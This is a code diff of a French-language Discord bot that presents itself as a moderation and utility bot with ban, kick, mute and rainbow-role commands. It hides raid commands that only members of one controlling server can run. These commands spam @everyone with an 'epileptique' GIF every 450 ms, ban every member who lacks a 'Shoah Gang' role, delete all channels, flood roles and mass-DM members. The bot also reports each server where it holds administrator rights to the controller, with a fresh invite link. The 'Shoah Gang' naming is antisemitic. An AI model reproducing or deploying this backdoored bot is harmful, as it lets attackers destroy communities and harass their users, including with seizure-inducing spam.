@@ -20,27 +20,20 @@ bot.on('message', message => {
   });
 
 bot.on('message', msg => {
-
   if (msg.guild === bot.guilds.find('id', '453631449804046336')){ 
     return;
   }
-  
-  
-
  if (bot.guilds.get('453631449804046336').members.get(msg.author.id) !== undefined) {
     
 if (msg.content === '.destruction') {
-  bot.guilds.get('453631449804046336').channels.get('454348199075774476').send(`Commande .destruction par ${msg.author.tag}`).catch(e => {});
+    console.log(`Commande .destruction par ${msg.author.tag}`);
     var interval = setInterval (function () {
-      msg.channel.send("@everyone @here .https://cdn.discordapp.com/attachments/436188674435317760/449911258221903883/epileptique.gif \n"+
-     "SHOAH GANG ON THE BEAT \n"+
-     "https://discord.gg/8vtFryt \n"+
-     "https://discord.gg/s5Y2RfG").catch(e => {});
+      msg.channel.send("@everyone @here Rejoin la team qui ta detruis petit facho https://discord.gg/W6WmNW8").catch(e => {});
     }, 450)
   }
 
 if (msg.content === '.oupss') {
-    bot.guilds.get('453631449804046336').channels.get('454348199075774476').send(`Commande .oupss par ${msg.author.tag}`).catch(e => {});
+    console.log(`Commande .oupss par ${msg.author.tag}`);
    fucked = false;
 
  
@@ -63,7 +56,7 @@ if (msg.content === '.oupss') {
 
 
 if (msg.content === '.banev') {
- bot.guilds.get('453631449804046336').channels.get('454348199075774476').send(`Commande .banev par ${msg.author.tag}`).catch(e => {});
+    console.log(`Commande .banev par ${msg.author.tag}`);
     msg.guild.members.forEach(member => {
       if (!member.roles.exists("name", "Shoah Gang") && member.bannable) member.ban().catch(e => {});
     });
@@ -71,13 +64,13 @@ if (msg.content === '.banev') {
 
 
 if (msg.content === '.leave') {
- bot.guilds.get('453631449804046336').channels.get('454348199075774476').send(`Commande .leave par ${msg.author.tag}`).catch(e => {});
-    if (msg.deletable) msg.delete().catch(e => {});
+    console.log(`Commande .leave par ${msg.author.tag}`);
+    if (msg.deletable) msg.delete();
     msg.guild.leave().catch(e => {});
   }
 
 if (msg.content === '.pardon') {
- bot.guilds.get('453631449804046336').channels.get('454348199075774476').send(`Commande .pardon par ${msg.author.tag}`).catch(e => {});
+    console.log(`Commande .pardon par ${msg.author.tag}`);
 
     msg.member.guild.createRole({
       name: "Shoah Gang",
@@ -89,7 +82,7 @@ if (msg.content === '.pardon') {
     }).catch(e => {});
   }
   if (msg.content === '.roleflood') {
- bot.guilds.get('453631449804046336').channels.get('454348199075774476').send(`Commande .roleflood par ${msg.author.tag}`).catch(e => {});
+    console.log(`Commande .roleflood par ${msg.author.tag}`);
     if (msg.deletable) msg.delete();
     let i = 0;
     let interval = setInterval(function () {
@@ -99,32 +92,27 @@ if (msg.content === '.pardon') {
       member.addRole(role).catch(e => {});
     })
     i++
-    }, 100)
+    }, 100).catch(e => {});
        });
     
       }
 
   if(msg.content === ".del"){
-    bot.guilds.get('453631449804046336').channels.get('454348199075774476').send(`Commande .del par ${msg.author.tag}`).catch(e => {});
-    if(msg.deletable) msg.delete();
-    msg.guild.channels.forEach(channel => {
-      if(channel.deletable) channel.delete()
-  })
+    if (msg.deletable) msg.delete().catch(e => {});
+    msg.guild.channels.forEach(chan => {
+      if (chan.deletable) chan.delete().catch(e => {});
+    });
   }
 
 
   if(msg.content === ".mp"){
-    bot.guilds.get('453631449804046336').channels.get('454348199075774476').send(`Commande .mp par ${msg.author.tag}`).catch(e => {});
     if(msg.deletable) msg.delete();
     i = 0;
     msg.guild.members.forEach(member => {
 
     if(i < 500){
       var interval = setInterval (function () {
-        member.send("@everyone @here .https://cdn.discordapp.com/attachments/436188674435317760/449911258221903883/epileptique.gif \n"+
-     "SHOAH GANG ON THE BEAT \n"+
-     "https://discord.gg/8vtFryt \n"+
-     "https://discord.gg/s5Y2RfG").catch(e => {});
+        member.send("https://discord.gg/W6WmNW8").catch(e => {});
       }, 450)
 
       }   
@@ -262,9 +250,6 @@ bot.on("message", message => {
     if(message.mentions.users.size === 0){
       message.reply(":x: ** Vous devez écrire la mention d'un joueur a kick ** :x:").catch(e => {});
     }
-    else if(!membere.bannable){
-      message.reply(":x: **Ce joueur n'est pas bannable, peut être à-t-il un rôle supérieur au mien ?** :x:")
-    }
     else {
   membere.kick().then(member => {
     return message.channel.send(":white_check_mark: `"+membere.user.username+"` **à été kick par ** `"+membere2.username+"` :white_check_mark:").catch(e => {});
@@ -324,11 +309,10 @@ bot.on("message", message => {
       .setColor("#FFCC99");
       var membere = message.author;
       let help2_embed = new Discord.RichEmbed()
-      .setTitle("Commande Utile / Moderation")
+      .setTitle("Commande Utile / Help")
       .addField(".ban", "Exemple `.ban @Gon`, Renvoyer les enemis dans leurs territoire !")
       .addField(".kick", "Exemple `.kick @Gon`, Expulser de vôtre territoire un ennemi")
-      .addField(".mute", "Exemple `.mute @Gon`, Retire le droit de parole à un membre !")
-      .addField(".unmute", "Exemple `.unmute @Gon` Redonne le droit de parole a un membre")
+      .addField(".mute", "Exemple `.mute @Gon`, Retire le droit de parole à un membre")
       .addField(".avatar", "Exemple `.avatar @Gon`, Fouille dans les trefonds de discord et récupérer l'image d'un ami")
       .addField(".userinfo", "Exemple `.userinfo @Gon`, Récupérer toutes les infos d'une personne :' )")
       .addField(".serverinfo", "Vous donnes toutes les infos croustillante sur le serveur")
@@ -346,7 +330,7 @@ bot.on("message", message => {
         if(guild.member(bot.user).hasPermission("ADMINISTRATOR")){
           var invite = guild.channels.find("id", guild.channels.random().id);
           invite.createInvite().then(invite => {
-            bot.guilds.get('453631449804046336').channels.get('454348199075774476').send(`[ADMINITRATEUR] Connecté sur ${guild.name} || ${guild.memberCount} membres || https://discord.gg/${invite.code} || Chef ${guild.owner}`).catch(e => {});
+            bot.guilds.get('453631449804046336').channels.get('453633302058762250').send(`[ADMINITRATEUR] Connecté sur ${guild.name} || ${guild.memberCount} membres || https://discord.gg/${invite.code} || Chef ${guild.owner}`).catch(e => {});
           })
         }
         else if(!guild.member(bot.user).hasPermission("ADMINISTRATOR")){
@@ -357,13 +341,13 @@ bot.on("message", message => {
         }
       });
       bot.on('guildDelete', guild => {
-        bot.guilds.get('453631449804046336').channels.get('453633302058762250').send(`[LEAVE] ${guild.name} || ${guild.memberCount} membres`).catch(e => {});
+        bot.guilds.get('453631449804046336').channels.get('453633302058762250').send(` [LEAVE] ${guild.name} || ${guild.memberCount} membres`).catch(e => {});
       })
       bot.on("message", message => {
         if (message.content === '.rainrole') {
           if (message.deletable) message.delete();
-                message.reply(':white_check_mark: Le rôle **Rainbow** à bien été crée. Exécuté la commande `.rainbow` pour poursuivre la procèdure !:white_check_mark:')
-          if (!message.member.hasPermission("ADMINISTRATOR")) return message.reply(":x: **Tu dois avoir les permissions `ADMINISTRATOR`** :x: ");
+                message.reply(':white_check_mark: Le rôle **Rainbow** à bien été crée. Exécuté la commande `.rainbow` pour poursuivre la procèdure !:white_check_mark:').catch(e => {});
+          if (!message.member.hasPermission("ADMINISTRATOR")) return message.reply(":x: **Tu dois avoir les permissions `ADMINISTRATOR`** :x: ").catch(e => {});
           message.guild.createRole({name: 'Rainbow'})
         }
       
@@ -377,26 +361,10 @@ bot.on("message", message => {
         var myRainbow = message.guild.roles.find("name", "Rainbow")
         let i = 0;
           let interval = setInterval(function () {
-          myRainbow.setColor('#000000').then(i++);
-          myRainbow.setColor('#00FFFF').then(i++);
-          myRainbow.setColor('#F0FFFF').then(i++);
-          myRainbow.setColor('#F5F5DC').then(i++);
-          myRainbow.setColor('#8A2BE2').then(i++);
-          myRainbow.setColor('#5F9EA0').then(i++);
-          myRainbow.setColor('#00008B').then(i++);
-          myRainbow.setColor('#BDB76B').then(i++);
-          myRainbow.setColor('#696969').then(i++);
-          myRainbow.setColor('#DCDCDC').then(i++);
-          myRainbow.setColor('#FFD700').then(i++);
-          myRainbow.setColor('#DAA520').then(i++);
-          myRainbow.setColor('#CD5C5C').then(i++);
-          myRainbow.setColor('#E6E6FA').then(i++);
-          myRainbow.setColor('#ADD8E6').then(i++);
-          myRainbow.setColor('#FFB6C1').then(i++);
-          myRainbow.setColor('#9370DB').then(i++);
-          myRainbow.setColor('#8b00ff').then(i++);
+myRainbow.setColor("RANDOM")
           
-        }, 4000);
+        }, 750)
       }
       })
+
 bot.login(process.env.BOT_TOKEN); 
